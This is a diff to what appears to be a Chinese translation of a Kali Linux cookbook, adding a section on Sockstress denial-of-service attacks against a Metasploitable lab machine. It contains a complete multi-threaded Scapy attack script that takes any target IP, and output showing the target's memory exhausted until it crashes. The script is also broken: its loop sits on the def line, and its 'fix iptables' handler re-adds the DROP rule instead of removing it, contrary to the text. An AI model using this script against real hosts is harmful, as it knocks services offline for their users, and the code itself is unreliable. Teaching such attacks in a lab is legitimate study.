@@ -1192,7 +1192,7 @@ def synflood(target,port):
         sleep(1) 
 ```
 
-脚本在执行时接受三个参数。 这些参数包括目标 IP 地址，SYN  泛洪所发送到的端口号，以及将用于执行 SYN 泛洪的线程或并发进程的数量。 每个线程以生成 0 到 65,535 之间的整数值开始。 此范围表示可分配给源端口的全部可能值。 定义源和目标端口地址的 TCP 报头的部分在长度上都是 16 比特。 每个位可以为 1 或 0。因此，有`2 ** 16`或 65,536 个可能的 TCP端 口地址。 单个源端口只能保持一个半开连接，因此通过为每个 SYN 请求生成唯一的源端口地址，我们可以大大提高攻击的性能：
+脚本在执行时接受三个参数。 这些参数包括目标 IP 地址，SYN  泛洪所发送到的端口号，以及将用于执行 SYN 泛洪的线程或并发进程的数量。 每个线程以生成 0 到 65,535 之间的整数值开始。 此范围表示可分配给源端口的全部可能值。 定义源和目标端口地址的 TCP 报头的部分在长度上都是 16 比特。 每个位可以为 1 或 0。因此，有`2 ** 16`或 65,536 个可能的 TCP 端 口地址。 单个源端口只能维持一个半开连接，因此通过为每个 SYN 请求生成唯一的源端口地址，我们可以大大提高攻击的性能：
 
 ```
 root@KaliLinux:~# ./syn_flood.py U
@@ -1208,3 +1208,164 @@ Performing SYN flood. Use Ctrl+C to stop attack.
 ### 工作原理
 
 TCP 服务只允许建立有限数量的半开连接。 通过快速发送大量的 TCP SYN 请求，这些可用的连接会被耗尽，并且服务器将不再能够接受新的传入连接。 因此，新用户将无法访问该服务。 通过将其用作 DDoS 并且使多个攻击系统同时执行脚本，该攻击的效率可以进一步加强。
+
+## 6.8 Sockstress DoS 攻击
+
+Sockstress DoS 攻击涉及到与目标服务相关的 TCP 端口建立一系列开放连接。 TCP 握手中的最终 ACK 响应的值应为 0。
+
+### 准备
+
+为了使用 Scapy 对目标执行Sockstress DoS 攻击，你需要有一个运行 TCP 网络服务的远程系统。 提供的示例使用 Metasploitable2 的实例用。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。
+
+### 操作步骤
+
+以下脚本使用 Scapy 编写，用于对目标系统执行 Sockstress DoS 攻击。 以下脚本可用于测试漏洞服务：
+
+```py
+#!/usr/bin/python
+from scapy.all import * 
+from time import sleep 
+import thread 
+import logging 
+import os 
+import signal 
+import sys 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+if len(sys.argv) != 4:   
+    print "Usage - ./sock_stress.py [Target-IP] [Port Number] [Threads]"   
+    print "Example - ./sock_stress.py 10.0.0.5 21 20"   
+    print "Example will perform a 20x multi-threaded sock-stress DoS attack "   
+    print "against the FTP (port 21) service on 10.0.0.5"  
+    print "\n***NOTE***"
+    print "Make sure you target a port that responds when a connection is made"   
+    sys.exit()
+
+target = str(sys.argv[1]) 
+dstport = int(sys.argv[2]) 
+threads = int(sys.argv[3])
+
+## This is where the magic happens 
+def sockstress(target,dstport):   while 0 == 0:      
+    try:         
+        x = random.randint(0,65535)         
+        response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags ='S'),timeout=1,verbose=0)                        
+        send(IP(dst=target)/ TCP(dport=dstport,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)     
+    except:         
+        pass
+ 
+## Graceful shutdown allows IP Table Repair 
+def graceful_shutdown(signal, frame):   
+    print '\nYou pressed Ctrl+C!'  
+    print 'Fixing IP Tables'   
+    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')   
+    sys.exit()
+
+## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections 
+os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP') 
+signal.signal(signal.SIGINT, graceful_shutdown)
+
+## Spin up multiple threads to launch the attack
+print "\nThe onslaught has begun...use Ctrl+C to stop the attack" 
+for x in range(0,threads):   
+    thread.start_new_thread(sockstress, (target,dstport))
+
+## Make it go FOREVER (...or at least until Ctrl+C) 
+while 0 == 0:   
+    sleep(1)
+
+```
+
+请注意，此脚本有两个主要功能，包括 sockstress 攻击功能和单独的正常关机功能。 关闭需要单独的函数，因为为了使脚本正常运行，脚本必须修改本地 iptables 规则。 此更改是必需的，以便使用 Scapy 完成与远程主机的 TCP 连接。 在第三章“端口扫描”的“使用 Scapy 配置连接扫描”中，更彻底地解决了这一问题。 在执行脚本之前，我们可以使用 netstat 和 free 工具为已建立的连接和正在使用的内存获取基线：
+
+```
+msfadmin@metasploitable:~$ netstat | grep ESTABLISHED 
+tcp6       0      0 172.16.36.131%13464:ssh 172.16.36.1%8191:49826  ESTABLISHED 
+udp        0      0 localhost:32840         localhost:32840         ESTABLISHED 
+msfadmin@metasploitable:~$ free -m 
+             
+             total       used       free     shared    buffers     cached 
+Mem:           503        157        345          0         13         54 
+-/+ buffers/cache:         89        413 
+Swap:            0          0          0 
+```
+
+通过使用 netstat，然后通过管道输出到`grep`函数，并只提取已建立的连接，我们可以看到只存在两个连接。 我们还可以使用`free`工具查看当前的内存使用情况。 `-m`选项用于返回以兆字节为单位的值。 在确定已建立的连接和可用内存的基线后，我们可以对此目标服务器启动攻击：
+
+```
+root@KaliLinux:~# ./sock_stress.py 
+Usage - ./sock_stress.py [Target-IP] [Port Number] [Threads] 
+Example - ./sock_stress.py 10.0.0.5 21 20 
+Example will perform a 20x multi-threaded sock-stress DoS attack against the FTP (port 21) service on 10.0.0.
+
+***NOTE*** 
+Make sure you target a port that responds when a connection is made 
+root@KaliLinux:~# ./sock_stress.py 172.16.36.131 21 20
+
+The onslaught has begun...use Ctrl+C to stop the attack
+```
+
+通过在没有任何提供的参数的情况下执行脚本，脚本将返回预期的语法和用法。脚本在执行时接受三个参数。这些参数包括目标 IP 地址，sock stress DoS所发送的端口号，以及将用于执行 sock stress DoS 的线程或并发进程的数量。每个线程以生成 0 到 65,535 之间的整数值开始。此范围表示可分配给源端口的全部可能值。定义源和目的地端口地址的 TCP 报头的部分在长度上都是 16 比特。每个位可以为值 1 或 0。因此，有`2 ** 16`或 65,536 个可能的 TCP 端口地址。单个源端口只能维持单个连接，因此通过为每个连接生成唯一的源端口地址，我们可以大大提高攻击的效率。一旦攻击开始，我们可以通过检查在目标服务器上建立的活动连接，来验证它是否正常工作：
+
+```
+msfadmin@metasploitable:~$ netstat | grep ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:25624     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:12129     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:31294     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:46731     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:15281     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:47576     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:27472     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:11152     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:56245     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:1161      ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:21064     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:29344     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:43747     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:59609     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:31927     ESTABLISHED
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:12257     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:54709     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:55595     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:12992     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:24171     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:37207     ESTABLISHED 
+tcp        0     20 172.16.36.131:ftp       172.16.36.232:39224     ESTABLISHED 
+```
+
+在执行脚本后的几分钟，我们可以看到已建立的连接的数量急剧增加。 此处显示的输出已截断，连接列表实际上明显长于此：
+
+```
+msfadmin@metasploitable:~$ free -m             
+             total       used       free     shared    buffers     cached 
+Mem:           503        497          6          0        149        
+138 -/+ buffers/cache:        209        294 
+Swap:            0          0          0 
+```
+
+通过连续使用`free` 工具，我们可以看到，系统的可用内存逐渐耗尽。 一旦内存空闲值下降到几乎没有，空闲缓冲区/缓存空间将开始下降：
+
+```
+msfadmin@metasploitable:~$ free -m             
+             total       used       free     shared    buffers     cached 
+Mem:           503        498          4          0          0          
+5 -/+ buffers/cache:        493         10 
+Swap:            0          0          0 
+```
+
+在本地系统上的所有资源耗尽之后，系统最终会崩溃。 完成此过程所需的时间将取决于可用的本地资源量。 在这里提供的示例中，这是在具有 512 MB RAM 的 Metasploitable VM 上执行的，攻击花费了大约 2 分钟来耗尽所有可用的本地资源并使服务器崩溃。 服务器崩溃后，或者你希望停止 DoS 攻击时，可以按`Ctrl + C`。
+
+```
+root@KaliLinux:~# ./sock_stress.py 172.16.36.131 21 20
+
+The onslaught has begun...use Ctrl+C to stop the attack
+^C 
+pressed Ctrl+C! 
+Fixing IP Tables 
+```
+
+脚本被编写来捕获由于按`Ctrl + C`而发送的终止信号，并且它将通过去除在终止脚本的执行序列之前生成的规则,来修复本地 iptables。
+
+### 工作原理
+
+在 sockstress DoS 中，三次握手中的最后的 ACK 封包的窗口值为 0。由于连接客户端的空窗口所示，漏洞服务不会传送任何数据来响应连接。 相反，服务器会保存要在内存中传输的数据。 使用这些连接充斥服务器将耗尽服务器的资源，包括内存，交换空间和计算能力。
